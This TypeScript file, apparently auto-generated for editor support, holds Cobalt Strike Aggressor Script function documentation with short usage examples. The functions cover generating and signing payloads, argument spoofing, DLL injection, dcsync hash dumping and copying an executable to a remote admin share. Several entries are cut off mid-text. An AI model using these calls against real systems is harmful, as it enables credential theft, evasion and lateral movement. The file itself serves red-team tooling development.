// AUTO-GENERATED from Cobalt Strike official documentation
// https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm

export interface OfficialFuncEntry {
  name: string;
  detail: string;
  documentation: string;
  anchors: string[];
}

export const OFFICIAL_FUNCTIONS: Record<string, OfficialFuncEntry> = {
  "-hasbootstraphint": {
    name: "-hasbootstraphint",
    detail: "-hasbootstraphint($1)",
    documentation: `This function checks the stage.smartinject malleable c2 profile setting for the active team server. If the setting is set to false, the function will return false. If the setting is set to true, then the payload will be checked for the x86 or x64 bootstrap hints and will return true if the hint is found. Use this function to determine if it is safe to use an artifact that passes GetProcAddress/GetModuleHandlA pointers to this payload.

**Arguments:**
- \`$1\` — byte array with a payload or shellcode.`,
    anchors: ["-hasbootstraphint"],
  },
  "-is64": {
    name: "-is64",
    detail: "-is64($1)",
    documentation: `Check if a session is on an x64 system or not (Beacon only).

**Arguments:**
- \`$1\` — Beacon/Session ID

**Example:**
\`\`\`
command x64 {
foreach $session (beacons()) {
if (-is64 $session['id']) {
println($session);
}
}
}
\`\`\``,
    anchors: ["-is64"],
  },
  "-isactive": {
    name: "-isactive",
    detail: "-isactive($1)",
    documentation: `Check if a session is active or not. A session is considered active if (a) it has not acknowledged an exit message AND (b) it is not disconnected from a parent Beacon.

**Arguments:**
- \`$1\` — Beacon/Session ID

**Example:**
\`\`\`
command active {
local('$bid');
foreach $bid (beacon_ids()) {
if (-isactive $bid) {
println("$bid is active!");
}
}
}
\`\`\``,
    anchors: ["-isactive"],
  },
  "-isadmin": {
    name: "-isadmin",
    detail: "-isadmin($1)",
    documentation: `Check if a session has admin rights

**Arguments:**
- \`$1\` — Beacon/Session ID

**Example:**
\`\`\`
command admin_sessions {
foreach $session (beacons()) {
if (-isadmin $session['id']) {
println($session);
}
}
}
\`\`\``,
    anchors: ["-isadmin"],
  },
  "-isbeacon": {
    name: "-isbeacon",
    detail: "-isbeacon($1)",
    documentation: `Check if a session is a Beacon or not.

**Arguments:**
- \`$1\` — Beacon/Session ID

**Example:**
\`\`\`
command beacons {
foreach $session (beacons()) {
if (-isbeacon $session['id']) {
println($session);
}
}
}
\`\`\``,
    anchors: ["-isbeacon"],
  },
  "-isssh": {
    name: "-isssh",
    detail: "-isssh($1)",
    documentation: `Check if a session is an SSH session or not.

**Arguments:**
- \`$1\` — Beacon/Session ID

**Example:**
\`\`\`
command ssh_sessions {
foreach $session (beacons()) {
if (-isssh $session['id']) {
println($session);
}
}
}
\`\`\``,
    anchors: ["-isssh"],
  },
  "action": {
    name: "action",
    detail: "action($1)",
    documentation: `Post a public action message to the event log. This is similar to the /me command.

**Arguments:**
- \`$1\` — the message

**Example:**
\`\`\`
action("dances!");
\`\`\``,
    anchors: ["action"],
  },
  "addTab": {
    name: "addTab",
    detail: "addTab($1, $2, $3)",
    documentation: `Create a tab to display a GUI object.

**Arguments:**
- \`$1\` — the title of the tab
- \`$2\` — a GUI object. A GUI object is one that is an instance of javax.swing.JComponent.
- \`$3\` — a tooltip to display when a user hovers over this tab.

**Example:**
\`\`\`
$label = [new javax.swing.JLabel: "Hello World"];
addTab("Hello!", $label, "this is an example");
\`\`\``,
    anchors: ["addTab"],
  },
  "addVisualization": {
    name: "addVisualization",
    detail: "addVisualization($1, $2)",
    documentation: `Register a visualization with Cobalt Strike.

**Arguments:**
- \`$1\` — the name of the visualization
- \`$2\` — a javax.swing.JComponent object

**Example:**
\`\`\`
$label = [new javax.swing.JLabel: "Hello World!"];
addVisualization("Hello World", $label);

See also

&showVisualization
\`\`\``,
    anchors: ["addVisualization"],
  },
  "add_to_clipboard": {
    name: "add_to_clipboard",
    detail: "add_to_clipboard($1)",
    documentation: `Add text to the clipboard, notify the user.

**Arguments:**
- \`$1\` — the text to add to the clipboard

**Example:**
\`\`\`
add_to_clipboard("Paste me you fool!");
\`\`\``,
    anchors: ["add_to_clipboard"],
  },
  "alias": {
    name: "alias",
    detail: "alias($1, $2)",
    documentation: `Creates an alias command in the Beacon console

**Arguments:**
- \`$1\` — the alias name to bind to
- \`$2\` — a callback function. Called when the user runs the alias. Arguments are: $0 = command run, $1 = beacon id, $2 = arguments.

**Example:**
\`\`\`
alias("foo", {
btask($1, "foo!");
});

See Also

User Defined Tab Completion
\`\`\``,
    anchors: ["alias"],
  },
  "alias_clear": {
    name: "alias_clear",
    detail: "alias_clear($1)",
    documentation: `Removes an alias command (and restores default functionality; if it existed)

**Arguments:**
- \`$1\` — the alias name to remove

**Example:**
\`\`\`
alias_clear("foo");
\`\`\``,
    anchors: ["alias_clear"],
  },
  "all_payloads": {
    name: "all_payloads",
    detail: "all_payloads($1, $2, $3, $4, $5)",
    documentation: `Generates all the stageless payloads (in x86 and x64) for all the configured listeners. Use the listeners_stageless aggressor function to see the list that will be used for the active team server.

**Arguments:**
- \`$1\` — The folder path to create the payloads in. This folder path must already exist.
- \`$2\` — A boolean value for whether the executable files should be signed.
- \`$3\` — A string value for the system call method. Valid values are:
- \`$4\` — (optional) The supporting HTTP library for generated beacons (wininet|winhttp|$null|blank string).
- \`$5\` — (optional) DNS Comm Mode Override. Use this to change the DNS Comm Mode from the default mode defined in Malleable C2 (dns|dns_over_https|$null|blank string).

**Example:**
\`\`\`
$folder = all_payloads("/tmp/payloads", 1, "None");println("Payloads have been saved to $folder");
\`\`\``,
    anchors: ["all_payloads"],
  },
  "applications": {
    name: "applications",
    detail: "Returns a list of application information in Cobalt Strike's data model",
    documentation: `Returns a list of application information in Cobalt Strike's data model. These applications are results from the System Profiler.

**Returns:** An array of dictionary objects with information about each application.

**Example:**
\`\`\`
printAll(applications());
\`\`\``,
    anchors: ["applications"],
  },
  "archives": {
    name: "archives",
    detail: "Returns a massive list of archived information about your activity from Cobalt S...",
    documentation: `Returns a massive list of archived information about your activity from Cobalt Strike's data model. This information is leaned on heavily to reconstruct your activity timeline in Cobalt Strike's reports.

**Returns:** An array of dictionary objects with information about your team's activity.

**Example:**
\`\`\`
foreach $index => $entry (archives()) {
println("\\c3( $+ $index $+ )\\o $entry");
}
\`\`\``,
    anchors: ["archives"],
  },
  "artifact": {
    name: "artifact",
    detail: "artifact($1, $2, $3, $4)",
    documentation: `DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &artifact_stager instead.

Generates a stager artifact (exe, dll) from a Cobalt Strike listener

**Arguments:**
- \`$1\` — the listener name
- \`$2\` — the artifact type
- \`$3\` — deprecated; this parameter no longer has any meaning.
- \`$4\` — x86|x64 - the architecture of the generated stager

**Returns:** A scalar containing the specified artifact.

**Note:** Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.

**Example:**
\`\`\`
$data = artifact("my-listener", "exe");

$handle = openf(">out.exe");
writeb($handle, $data);
closef($handle);
\`\`\``,
    anchors: ["artifact"],
  },
  "artifact_general": {
    name: "artifact_general",
    detail: "artifact_general($1, $2, $3)",
    documentation: `Generates a payload artifact from arbitrary shellcode.

**Arguments:**
- \`$1\` — the shellcode
- \`$2\` — the artifact type
- \`$3\` — x86|x64 - the architecture of the generated payload

**Note:** While the Python artifact in Cobalt Strike is designed to simultaneously carry an x86 and x64 payload; this function will only populate the script with the architecture argument specified as $3`,
    anchors: ["artifact_general"],
  },
  "artifact_payload": {
    name: "artifact_payload",
    detail: "artifact_payload($1, $2, $3, $4, $5, $6, $7)",
    documentation: `Generates a stageless payload artifact (exe, dll) from a Cobalt Strike listener name

**Arguments:**
- \`$1\` — the listener name
- \`$2\` — the artifact type
- \`$3\` — x86|x64 - the architecture of the generated payload (stage)
- \`$4\` — exit method: 'thread' (leave the thread when done) or 'process' (exit the process when done). Use 'thread' if injecting into an existing process.
- \`$5\` — A string value for the system call method. Valid values are:
- \`$6\` — (optional) The supporting HTTP library for generated beacons (wininet|winhttp|$null|blank string).
- \`$7\` — (optional) DNS Comm Mode Override. Use this to change the DNS Comm Mode from the default mode defined in Malleable C2 (dns|dns_over_https|$null|blank string).

**Note:** While the Python artifact in Cobalt Strike is designed to simultaneously carry an x86 and x64 payload; this function will only populate the script with the architecture argument specified as $3

**Example:**
\`\`\`
$data = artifact_payload("my-listener", "exe", "x86", “process”, “Indirect”);
\`\`\``,
    anchors: ["artifact_payload"],
  },
  "artifact_sign": {
    name: "artifact_sign",
    detail: "artifact_sign($1)",
    documentation: `Sign an EXE or DLL file using the code-signer malleable c2 profile setting for the active team server.

**Arguments:**
- \`$1\` — the contents of the EXE or DLL file to sign

**Returns:** A scalar containing the signed artifact.

**Note:** - This function requires that a code-signing certificate is specified in this server's Malleable C2 profile. If no code-signing certificate is configured, this function will return $1 with no changes.

- 

If the Cobalt Strike UI is connected to multiple team servers, the code-signer used is for the

**Example:**
\`\`\`
# generate an artifact!
$data = artifact_payload("my-listener", "exe", "x64", "process", "Indirect");

# sign it.
$data = artifact_sign($data);

# save it
$handle = openf(">out.exe");
writeb($handle, $data);
closef($handle);
\`\`\``,
    anchors: ["artifact_sign"],
  },
  "artifact_stageless": {
    name: "artifact_stageless",
    detail: "artifact_stageless($1, $2, $3, $4, $5)",
    documentation: `DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &artifact_payload instead.

Generates a stageless artifact (exe, dll) from a (local) Cobalt Strike listener

**Arguments:**
- \`$1\` — the listener name (must be local to this team server)
- \`$2\` — the artifact type
- \`$3\` — x86|x64 - the architecture of the generated payload (stage)
- \`$4\` — proxy configuration string
- \`$5\` — callback function. This function is called when the artifact is ready. The $1 argument is the stageless content.

**Note:** - This function provides the stageless artifact via a callback function. This is necessary because Cobalt Strike generates payload stages on the team server.

- The proxy configuration string is the same string you would use with Payloads -> Windows Stageless Payload. *direct* ignores the local prox

**Example:**
\`\`\`
sub ready {
local('$handle');
$handle = openf(">out.exe");
writeb($handle, $1);
closef($handle);
}

artifact_stageless("my-listener", "exe", "x86", "", &ready);
\`\`\``,
    anchors: ["artifact_stageless"],
  },
  "artifact_stager": {
    name: "artifact_stager",
    detail: "artifact_stager($1, $2, $3)",
    documentation: `Generates a stager artifact (exe, dll) from a Cobalt Strike listener

**Arguments:**
- \`$1\` — the listener name
- \`$2\` — the artifact type
- \`$3\` — x86|x64 - the architecture of the generated stager

**Returns:** A scalar containing the specified artifact.

**Note:** Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.

**Example:**
\`\`\`
$data = artifact_stager("my-listener", "exe", "x86");

$handle = openf(">out.exe");
writeb($handle, $data);
closef($handle);
\`\`\``,
    anchors: ["artifact_stager"],
  },
  "barch": {
    name: "barch",
    detail: "barch($1)",
    documentation: `Returns the architecture of your Beacon session (e.g., x86 or x64)

**Arguments:**
- \`$1\` — the id for the beacon to pull metadata for

**Note:** If the architecture is unknown (e.g., a DNS Beacon that hasn't sent metadata yet); this function will return x86.

**Example:**
\`\`\`
println("Arch is: " . barch($1));
\`\`\``,
    anchors: ["barch"],
  },
  "bargue_add": {
    name: "bargue_add",
    detail: "bargue_add($1, $2, $3)",
    documentation: `This function adds an option to Beacon's list of commands to spoof arguments for.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the command to spoof arguments for. Environment variables are OK here too.
- \`$3\` — the fake arguments to use when the specified command is run.

**Note:** - The process match is exact. If Beacon tries to launch "net.exe", it will not match net, NET.EXE, or c:\\windows\\system32\\net.exe. It will only match net.exe.

- x86 Beacon can only spoof arguments in x86 child processes. Likewise, x64 Beacon can only spoof arguments in x64 child processes.

- The r

**Example:**
\`\`\`
# spoof cmd.exe arguments.
bargue_add($1, "%COMSPEC%", "/K \\"cd c:\\windows\\temp & startupdatenow.bat\\"");

# spoof net arguments
bargue_add($1, "net", "user guest /active:no");
\`\`\``,
    anchors: ["bargue_add"],
  },
  "bargue_list": {
    name: "bargue_list",
    detail: "bargue_list($1)",
    documentation: `List the commands + fake arguments Beacon will spoof arguments for.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
bargue_list($1);
\`\`\``,
    anchors: ["bargue_list"],
  },
  "bargue_remove": {
    name: "bargue_remove",
    detail: "bargue_remove($1, $2)",
    documentation: `This function removes an option to Beacon's list of commands to spoof arguments for.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the command to spoof arguments for. Environment variables are OK here too.

**Example:**
\`\`\`
# don't spoof cmd.exe
bargue_remove($1, "%COMSPEC%");
\`\`\``,
    anchors: ["bargue_remove"],
  },
  "base64_decode": {
    name: "base64_decode",
    detail: "base64_decode($1)",
    documentation: `Unwrap a base64-encoded string

**Arguments:**
- \`$1\` — the string to decode

**Returns:** The argument processed by a base64 decoder

**Example:**
\`\`\`
println(base64_decode(base64_encode("this is a test")));
\`\`\``,
    anchors: ["base64_decode"],
  },
  "base64_encode": {
    name: "base64_encode",
    detail: "base64_encode($1)",
    documentation: `Base64 encode a string

**Arguments:**
- \`$1\` — the string to encode

**Returns:** The argument processed by a base64 encoder

**Example:**
\`\`\`
println(base64_encode("this is a test"));
\`\`\``,
    anchors: ["base64_encode"],
  },
  "bbeacon_config": {
    name: "bbeacon_config",
    detail: "Use this script function with the host command to view and update beacon status ...",
    documentation: `Use this script function with the host command to view and update beacon status and configuration . Use the failover_notification command to control beacon failover notifications

Failover_Notification Command

Use this command to retrieve the current notification setting from a beacon [HTTP|DNS]. Use the [true|false] arguments to enable/disable notifications from a beacon [HTTP|DNS] when host rotation occurs from failover events.

bbeacon_config failover_notification [true | false]

**Arguments:** add
Add a host/uri to the beacons callback host list. The uri must be known by the server. A maximum of 32 hosts may be defined. Multiple hosts and uris can be used by way of a comma-separated list.
[hostname] [uri]

info
Retrieve host callback information from a beacon.

hold
Hold a host in the callback host list [Random and Round-Robin rotation only]. Multiple hosts can be used by way of a comma-separated list.
[hostname]

profiles
List the host profiles available in the beacon config.

release
Release a host in the callback host list [Random and Round-Robin rotation only]. Multiple hosts can be used by way of a comma-separated list.
[hostname]

remove
Remove a host from the beacons callback host list. Multiple hosts can be used by way of a comma-separated list.
[hostname]

reset
Reset the status and/or statistics for callback hosts.
[all|status|statistics] [hostname]

update
Change the host/uri of an existing host/uri in the host list. The uri must be known by the server. Multiple hosts and uris can be used by way of a comma-separated list.
[original-hostname] [new-hostname] [new-uri]

Examples

Add a host to host list

$beacon_id = $1;
bbeacon_config($beacon_id, "host", "add", [hostname], [uri]);
bbeacon_config($beacon_id, "host", "add", [hostname1,hostname2], [uri1,uri2]);

Remove a host

$beacon_id = $1;
bbeacon_config($beacon_id, "host", "remove", [hostname]);
bbeacon_config($beacon_id, "host", "remove", [hostname1,hostname2]);

Change a host name

$beacon_id = $1;
bbeacon_config($beacon_id, "host", "update", [original-hostname], [new-hostname]);
bbeacon_config($beacon_id, "host", "update", [original-hostname1,original-hostname2], [new-hostname1,new-hostname2]);
bbeacon_config($beacon_id, "host", "update", [original-hostname], [new-hostname], [new-uri]);
bbeacon_config($beacon_id, "host", "update", [original-hostname1,original-hostname2], [new-hostname1,new-hostname2], [new-uri1,new-uri2]);

List defined host profile host names

$beacon_id = $1;
bbeacon_config($beacon_id, "host", "profiles");

Retrieve host callback information

$beacon_id = $1;
bbeacon_config($beacon_id, "host", "info");

Reset status/statistics

$beacon_id = $1;
bbeacon_config($beacon_id, "host", "reset", "[all|status|statistics]");
bbeacon_config($beacon_id, "host", "reset", "[all|status|statistics]", [hostname]);
bbeacon_config($beacon_id, "host", "reset", "[all|status|statistics]", [hostname1,hostname2]);

NOTE: 

Resetting status will reset:

- Host held setting

Resetting statistics will reset:

- Last successful connection timestamp

- Last failed connection timestamp

- Successful connection count

- Failed connection count

**Example:**
\`\`\`
$beacon_id = $1;
bbeacon_config($beacon_id, "failover_notification");
bbeacon_config($beacon_id, "failover_notification", "true");
bbeacon_config($beacon_id, "failover_notification", "false");

Host Command

Use this command to view and update beacon status and configuration of the beacons callback host list.

bbeacon_config [host] [action] [arguments]

where Action and Arguments can be:

Action
Description
\`\`\``,
    anchors: ["bbeacon_config"],
  },
  "bbeacon_gate": {
    name: "bbeacon_gate",
    detail: "bbeacon_gate($1, $2)",
    documentation: `Change the use of beacon gate at runtime to disable/enable the functionality. See Malleable PE, Process Injection, and Post Exploitation > Beacon Gate for more information.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — enable or disable to change the beacon gate behavior.

**Example:**
\`\`\`
# Disable the beacon gate functionality
bbeacon_gate($1, "disable");
\`\`\``,
    anchors: ["bbeacon_gate"],
  },
  "bblockdlls": {
    name: "bblockdlls",
    detail: "bblockdlls($1, $2)",
    documentation: `Launch child processes with binary signature policy that blocks non-Microsoft DLLs from loading in the process space.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — true or false; block non-Microsoft DLLs in child process

**Note:** This attribute is available in Windows 10 only.

**Example:**
\`\`\`
on beacon_initial {
binput($1, "blockdlls start");
bblockdlls($1, true);
}
\`\`\``,
    anchors: ["bblockdlls"],
  },
  "bbrowser": {
    name: "bbrowser",
    detail: "Generate the beacon browser GUI component",
    documentation: `Generate the beacon browser GUI component. Shows only Beacons.

**Returns:** The beacon browser GUI object (a javax.swing.JComponent)

**Example:**
\`\`\`
addVisualization("Beacon Browser", bbrowser());

See also

&showVisualization
\`\`\``,
    anchors: ["bbrowser"],
  },
  "bbrowserpivot": {
    name: "bbrowserpivot",
    detail: "bbrowserpivot($1, $2, $3)",
    documentation: `Start a Browser Pivot

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the PID to inject the browser pivot agent into.
- \`$3\` — the architecture of the target PID (x86|x64)

**Example:**
\`\`\`
bbrowserpivot($1, 1234, "x86");
\`\`\``,
    anchors: ["bbrowserpivot"],
  },
  "bbrowserpivot_stop": {
    name: "bbrowserpivot_stop",
    detail: "bbrowserpivot_stop($1)",
    documentation: `Stop a Browser Pivot

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
bbrowserpivot_stop($1);
\`\`\``,
    anchors: ["bbrowserpivot_stop"],
  },
  "bbypassuac": {
    name: "bbypassuac",
    detail: "REMOVED Removed in Cobalt Strike 4",
    documentation: `REMOVED Removed in Cobalt Strike 4.0.`,
    anchors: ["bbypassuac"],
  },
  "bcancel": {
    name: "bcancel",
    detail: "bcancel($1, $2)",
    documentation: `Cancel a file download

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the file to cancel or a wildcard.

**Example:**
\`\`\`
item "&Cancel Downloads" {
bcancel($1, "*");
}
\`\`\``,
    anchors: ["bcancel"],
  },
  "bcd": {
    name: "bcd",
    detail: "bcd($1, $2)",
    documentation: `Ask a Beacon to change it's current working directory.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the folder to change to.

**Example:**
\`\`\`
# create a command to change to the user's home directory
alias home {
$home = "c:\\\\users\\\\" . binfo($1, "user");
bcd($1, $home);
}
\`\`\``,
    anchors: ["bcd"],
  },
  "bcheckin": {
    name: "bcheckin",
    detail: "bcheckin($1)",
    documentation: `Ask a Beacon to checkin. This is basically a no-op for Beacon.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
item "&Checkin" {
binput($1, "checkin");
bcheckin($1);
}
\`\`\``,
    anchors: ["bcheckin"],
  },
  "bclear": {
    name: "bclear",
    detail: "bclear($1)",
    documentation: `This is the "oops" command. It clears the queued tasks for the specified beacon.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
bclear($1);
\`\`\``,
    anchors: ["bclear"],
  },
  "bclipboard": {
    name: "bclipboard",
    detail: "bclipboard($1)",
    documentation: `Ask beacon to get the text clipboard contents.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
bclipboard($1);
\`\`\``,
    anchors: ["bclipboard"],
  },
  "bconnect": {
    name: "bconnect",
    detail: "bconnect($1, $2, $3)",
    documentation: `Ask Beacon (or SSH session) to connect to a Beacon peer over a TCP socket

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the target to connect to
- \`$3\` — (optional) the port to use. Default profile port is used otherwise.

**Note:** Use &beacon_link if you want a script function that will connect or link based on a listener configuration.

**Example:**
\`\`\`
bconnect($1, "DC");
\`\`\``,
    anchors: ["bconnect"],
  },
  "bcovertvpn": {
    name: "bcovertvpn",
    detail: "bcovertvpn($1, $2, $3, $4)",
    documentation: `Ask Beacon to deploy a Covert VPN client.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the Covert VPN interface to deploy
- \`$3\` — the IP address of the interface [on target] to bridge into
- \`$4\` — (optional) the MAC address of the Covert VPN interface

**Example:**
\`\`\`
bcovertvpn($1, "phear0", "172.16.48.18");
\`\`\``,
    anchors: ["bcovertvpn"],
  },
  "bcp": {
    name: "bcp",
    detail: "bcp($1, $2, $3)",
    documentation: `Ask Beacon to copy a file or folder.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the file or folder to copy
- \`$3\` — the destination

**Example:**
\`\`\`
bcp($1, "evil.exe", "\\\\\\\\target\\\\C$\\\\evil.exe");
\`\`\``,
    anchors: ["bcp"],
  },
  "bdata": {
    name: "bdata",
    detail: "bdata($1)",
    documentation: `Get metadata for a Beacon session.

**Arguments:**
- \`$1\` — the id for the beacon to pull metadata for

**Returns:** A dictionary object with metadata about the Beacon session.

**Example:**
\`\`\`
println(bdata("1234"));
\`\`\``,
    anchors: ["bdata"],
  },
  "bdata_data_store_load": {
    name: "bdata_data_store_load",
    detail: "bdata_data_store_load($1, $2, $3, $4)",
    documentation: `Load post-ex items to Beacon. This provides a mechanism to upload data and then query it via BOFs using APIs such as BeaconStoreGetItem().

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — item type [bof|dotnet|file]
- \`$3\` — file path
- \`$4\` — (optional) item name (If omitted, the file name is used).

**Example:**
\`\`\`
alias "data_store_load" {
blog($1, "Loading data store...");
bdata_store_load($1, "bof", "/home/someone/file.bof");
bdata_store_load($1, "dotnet", "/home/someone/file.dotnet");
bdata_store_load($1, "file", "/home/someone/file.data");
blog($1, "Loaded data store...");
}

alias "data_store_load_with_name" {
blog($1, "Loading data store with names...");
bdata_store_load($1, "bof", "/home/someone/file.bof", "myBof");
bdata_store_load($1, "dotnet", "/home/someone/file.dotnet", "myDotNet");
bdata_store_load($1, "file", "/home/someone/file.data", "myData");
blog($1, "Loaded data store with names...")
\`\`\``,
    anchors: ["bdata_data_store_load"],
  },
  "bdata_data_store_unload": {
    name: "bdata_data_store_unload",
    detail: "bdata_data_store_unload($1, $2)",
    documentation: `Remove specific post-ex item from the store.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — index

**Example:**
\`\`\`
bdata_store_unload($1, parseNumber($2));
\`\`\``,
    anchors: ["bdata_data_store_unload"],
  },
  "bdata_store_list": {
    name: "bdata_store_list",
    detail: "bdata_store_list($1)",
    documentation: `List the post-ex items currently available in the data store.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
bdata_store_list($1);
\`\`\``,
    anchors: ["bdata_store_list"],
  },
  "bdcsync": {
    name: "bdcsync",
    detail: "bdcsync($1, $2, $3, $4, $5)",
    documentation: `Use mimikatz's dcsync command to pull a user's password hash from a domain controller. This function requires a domain administrator trust relationship.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — fully qualified name of the domain
- \`$3\` — (optional) DOMAIN\\user to pull hashes for
- \`$4\` — (optional) the PID to inject the dcsync command into or $null
- \`$5\` — (optional) the architecture of the target PID (x86|x64) or $null

**Note:** If $3 is left out, dcsync will dump all domain hashes.

Examples
Spawn a temporary process
# dump a specific account
bdcsync($1, "PLAYLAND.testlab", "PLAYLAND\\\\Administrator");

# dump all accounts
bdcsync($1, "PLAYLAND.testlab");

Inject into the specified process
# dump a specific account
bdcsync(`,
    anchors: ["bdcsync"],
  },
  "bdesktop": {
    name: "bdesktop",
    detail: "bdesktop($1)",
    documentation: `Start a VNC session.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
item "&Desktop (VNC)" {
bdesktop($1); 
}
\`\`\``,
    anchors: ["bdesktop"],
  },
  "bdllinject": {
    name: "bdllinject",
    detail: "bdllinject($1, $2, $3)",
    documentation: `Inject a Reflective DLL into a process.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the PID to inject the DLL into
- \`$3\` — the local path to the Reflective DLL

**Example:**
\`\`\`
bdllinject($1, 1234, script_resource("test.dll"));
\`\`\``,
    anchors: ["bdllinject"],
  },
  "bdllload": {
    name: "bdllload",
    detail: "bdllload($1, $2, $3)",
    documentation: `Call LoadLibrary() in a remote process with the specified DLL.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the target process PID
- \`$3\` — the on-target path to a DLL

**Note:** The DLL must be the same architecture as the target process.

**Example:**
\`\`\`
bdllload($1, 1234, "c:\\\\windows\\\\mystuff.dll");
\`\`\``,
    anchors: ["bdllload"],
  },
  "bdllspawn": {
    name: "bdllspawn",
    detail: "bdllspawn($1, $2, $3, $4, $5, $6, $7)",
    documentation: `Spawn a Reflective DLL as a Beacon post-exploitation job.

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the local path to the Reflective DLL
- \`$3\` — a parameter to pass to the DLL
- \`$4\` — a short description of this post exploitation job (shows up in jobs output)
- \`$5\` — wait time for returned data specified in milliseconds (5000 = 5 seconds)
- \`$6\` — true/false; use impersonated token when running this post-ex job?
- \`$7\` — (optional) callback function with the results. Arguments to the callback are: $1 = beacon ID, $2 = results, $3 = information map

**Note:** - This function will spawn an x86 process if the Reflective DLL is an x86 DLL. Likewise, if the Reflective DLL is an x64 DLL, this function will spawn an x64 process.

- A well-behaved Reflective DLL follows these rules:
- Receives a parameter via the reserved DllMain parameter when the DLL_PROCESS_`,
    anchors: ["bdllspawn"],
  },
  "bdownload": {
    name: "bdownload",
    detail: "bdownload($1, $2)",
    documentation: `Ask a Beacon to download a file

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.
- \`$2\` — the file to request

**Example:**
\`\`\`
bdownload($1, "c:\\\\sysprep.inf");
\`\`\``,
    anchors: ["bdownload"],
  },
  "bdrives": {
    name: "bdrives",
    detail: "bdrives($1)",
    documentation: `Ask Beacon to list the drives on the compromised system

**Arguments:**
- \`$1\` — the id for the beacon. This may be an array or a single ID.

**Example:**
\`\`\`
item "&Drives" {
binput($1, "drives");
bdrives($1);
}
\`\`\``,
    anchors: ["bdrives"],
  },
  "beacon_command_describe": {
    name: "beacon_command_describe",
    detail: "beacon_command_describe($1)",
    documentation: `Describe a Beacon command.

**Arguments:**
- \`$1\` — the command

**Returns:** A string description of the Beacon command.

**Example:**
\`\`\`
println(beacon_command_describe("ls"));
\`\`\``,
    anchors: ["beacon_command_describe"],
  },
  "beacon_command_detail": {
    name: "beacon_command_detail",
    detail: "beacon_command_detail($1)",
    documentation: `Get the help information for a Beacon command.

**Arguments:**
- \`$1\` — the command

**Returns:** A string with helpful information about a Beacon command.

**Example:**
\`\`\`
println(beacon_command_detail("ls"));
\`\`\``,
    anchors: ["beacon_command_detail"],
  },
  "beacon_command_group": {
    name: "beacon_command_group",
    detail: "beacon_command_group($1, $2, $3)",
    documentation: `Register a Help Group. A Help Group can assist with organizing the Beacon console's help command output (see Beacon console help help).

Groups will not appear in help until you register commands for the group.

Added groups will reset when a client disconnects.

**Arguments:**
- \`$1\` — the group id (registers commands to the group). Do not include "," or "@" characters in group ids.
- \`$2\` — group name
- \`$3\` — group description

**Example:**
\`\`\`
alis echo {
blog($1, "You typed: " . substr($1, 5));
}

beacon_command_group(
"my_help_group_id",
"My Help Group Name",
"This is my example help group");

beacon_command_register(
"echo",
"echo text to beacon log",
"Synopsis: echo [arguments]\\n\\nLog arguments to the Beacon console",
"my_help_group_id");
\`\`\``,
    anchors: ["beacon_command_group"],
  },
  "beacon_command_register": {
    name: "beacon_command_register",
    detail: "beacon_command_register($1, $2, $3, $4)",
    documentation: `Register help information for a Beacon command.

**Arguments:**
- \`$1\` — the command
- \`$2\` — the short description of the command
- \`$3\` — the long-form help for the command.
- \`$4\` — (optional) the group id to assign the command. If the group id does not exist, it is ignored.

**Example:**
\`\`\`
alis echo {
blog($1, "You typed: " . substr($1, 5));
}

beacon_command_group(
"my_help_group_id",
"My Help Group Name",
"This is my example help group");

beacon_command_register(
"echo", 
"echo text to beacon log", 
"Synopsis: echo [arguments]\\n\\nLog arguments to the beacon console");
"my_help_group_id");

See Also

User Defined Tab Completion
\`\`\``,
    anchors: ["beacon_command_register"],
  },
  "beacon_commands": {
    name: "beacon_commands",
    detail: "Get a list of Beacon commands",
    documentation: `Get a list of Beacon commands.

**Returns:** An array of Beacon commands.

**Example:**
\`\`\`
printAll(beacon_commands());
\`\`\``,
    anchors: ["beacon_commands"],
  },
  "beacon_data": {
    name: "beacon_data",
    detail: "beacon_data($1)",
    documentation: `Get metadata for a Beacon session.

**Arguments:**
- \`$1\` — the id for the beacon to pull metadata for

**Returns:** A dictionary object with metadata about the Beacon session.

**Example:**
\`\`\`
println(beacon_data("1234"));
\`\`\``,
    anchors: ["beacon_data"],
  },
  "beacon_elevator_describe": {
    name: "beacon_elevator_describe",
    detail: "beacon_elevator_describe($1)",
    documentation: `Describe a Beacon command elevator exploit

**Arguments:**
- \`$1\` — the exploit

